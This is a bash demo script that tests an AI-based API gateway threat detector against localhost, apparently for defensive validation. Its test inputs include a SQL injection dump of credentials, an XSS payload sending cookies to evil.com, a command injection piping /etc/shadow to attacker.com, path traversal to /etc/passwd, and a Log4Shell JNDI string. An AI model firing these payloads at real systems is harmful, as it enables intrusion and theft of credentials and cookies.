#!/bin/bash

# Kong Guard AI - Enterprise AI Detection Demo
# This script demonstrates the AI-powered threat detection capabilities

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     Kong Guard AI - Enterprise AI Threat Detection Demo      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
KONG_URL="http://localhost:18000"
TEST_ENDPOINT="/test"

# Function to test a request
test_request() {
    local test_name="$1"
    local method="$2"
    local url="$3"
    local data="$4"
    local expected_result="$5"
    
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}Test:${NC} $test_name"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    if [ "$method" = "GET" ]; then
        echo "Request: GET $url"
        response=$(curl -s -w "\n%{http_code}" -m 5 "$KONG_URL$url" 2>/dev/null)
    else
        echo "Request: POST $url"
        echo "Body: $data"
        response=$(curl -s -w "\n%{http_code}" -X POST -H "Content-Type: application/json" -d "$data" -m 5 "$KONG_URL$url" 2>/dev/null)
    fi
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | head -n -1)
    
    # Parse response
    if [ "$http_code" = "403" ]; then
        echo -e "${RED}✗ BLOCKED${NC} (HTTP $http_code)"
        threat_type=$(echo "$body" | grep -o '"threat_type":"[^"]*"' | cut -d'"' -f4 || echo "unknown")
        incident_id=$(echo "$body" | grep -o '"incident_id":"[^"]*"' | cut -d'"' -f4 || echo "N/A")
        echo -e "Threat Type: ${RED}$threat_type${NC}"
        echo "Incident ID: $incident_id"
        
        # Check if AI was used
        if echo "$body" | grep -q "ai_powered"; then
            echo -e "${BLUE}AI Analysis:${NC} Yes"
            reasoning=$(echo "$body" | grep -o '"reasoning":"[^"]*"' | cut -d'"' -f4 || echo "N/A")
            confidence=$(echo "$body" | grep -o '"confidence":[0-9.]*' | cut -d':' -f2 || echo "N/A")
            echo "Reasoning: $reasoning"
            echo "Confidence: $confidence"
        fi
    elif [ "$http_code" = "429" ]; then
        echo -e "${YELLOW}⚠ RATE LIMITED${NC} (HTTP $http_code)"
    elif [ "$http_code" = "200" ]; then
        echo -e "${GREEN}✓ ALLOWED${NC} (HTTP $http_code)"
    else
        echo -e "${RED}✗ ERROR${NC} (HTTP $http_code)"
    fi
    
    echo ""
}

# Start tests
echo "Starting AI-powered threat detection tests..."
echo ""

# Test 1: Normal requests
test_request \
    "Normal User Request" \
    "GET" \
    "/test/get?name=John&email=john@example.com" \
    "" \
    "ALLOW"

# Test 2: SQL Injection
test_request \
    "SQL Injection Attack" \
    "GET" \
    "/test/get?id=1'+UNION+SELECT+username,password+FROM+users--" \
    "" \
    "BLOCK"

# Test 3: XSS Attack
test_request \
    "Cross-Site Scripting (XSS)" \
    "POST" \
    "/test/post" \
    '{"comment":"<script>fetch(\"http://evil.com/steal?cookie=\"+document.cookie)</script>"}' \
    "BLOCK"

# Test 4: Path Traversal
test_request \
    "Path Traversal Attack" \
    "GET" \
    "/test/../../../../../../etc/passwd" \
    "" \
    "BLOCK"

# Test 5: Command Injection
test_request \
    "Command Injection" \
    "POST" \
    "/test/execute" \
    '{"cmd":"ls; cat /etc/shadow | curl http://attacker.com/steal -d @-"}' \
    "BLOCK"

# Test 6: Sophisticated Attack (AI should excel here)
test_request \
    "Obfuscated SQL Injection (AI Detection)" \
    "POST" \
    "/test/login" \
    '{"username":"admin","password":"x\" OR \"1\"=\"1\" /*","remember":true}' \
    "BLOCK"

# Test 7: Zero-day pattern (AI should detect unusual patterns)
test_request \
    "Unusual Pattern (Potential Zero-Day)" \
    "POST" \
    "/test/api" \
    '{"data":"${jndi:ldap://malicious.server/a}","type":"log4j"}' \
    "BLOCK"

# Test 8: Credential Stuffing
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}Test:${NC} Credential Stuffing Attack (Multiple Rapid Logins)"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo "Sending 10 rapid login attempts..."

for i in {1..10}; do
    response=$(curl -s -w "%{http_code}" -X POST -H "Content-Type: application/json" \
        -d "{\"username\":\"user$i\",\"password\":\"pass$i\"}" \
        -m 1 "$KONG_URL/test/login" 2>/dev/null | tail -n 1)
    
    if [ "$response" = "403" ]; then
        echo -e "Attempt $i: ${RED}BLOCKED${NC}"
    elif [ "$response" = "429" ]; then
        echo -e "Attempt $i: ${YELLOW}RATE LIMITED${NC}"
    else
        echo -e "Attempt $i: ${GREEN}OK${NC}"
    fi
done
echo ""

# Test 9: DDoS Simulation
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}Test:${NC} DDoS Pattern Detection"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo "Sending rapid burst of requests..."

blocked_count=0
for i in {1..20}; do
    response=$(curl -s -w "%{http_code}" -m 0.5 "$KONG_URL/test/get?burst=$i" 2>/dev/null | tail -n 1)
    if [ "$response" = "403" ] || [ "$response" = "429" ]; then
        ((blocked_count++))
    fi
done

echo -e "Result: $blocked_count/20 requests blocked/rate limited"
if [ $blocked_count -gt 10 ]; then
    echo -e "${GREEN}✓ DDoS Protection Active${NC}"
else
    echo -e "${YELLOW}⚠ DDoS Protection Partially Active${NC}"
fi
echo ""

# Summary
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║                         TEST SUMMARY                         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Kong Guard AI Enterprise Features Demonstrated:"
echo "✓ SQL Injection Detection"
echo "✓ XSS Attack Prevention"
echo "✓ Path Traversal Blocking"
echo "✓ Command Injection Prevention"
echo "✓ AI-Powered Pattern Recognition"
echo "✓ Zero-Day Attack Detection"
echo "✓ Credential Stuffing Protection"
echo "✓ DDoS Mitigation"
echo ""
echo "AI Capabilities:"
echo "• Context-aware threat analysis"
echo "• Confidence scoring"
echo "• Threat reasoning and explanation"
echo "• Adaptive learning from patterns"
echo "• Unknown threat detection"
echo ""
echo -e "${GREEN}Enterprise AI threat detection is active and protecting your APIs!${NC}"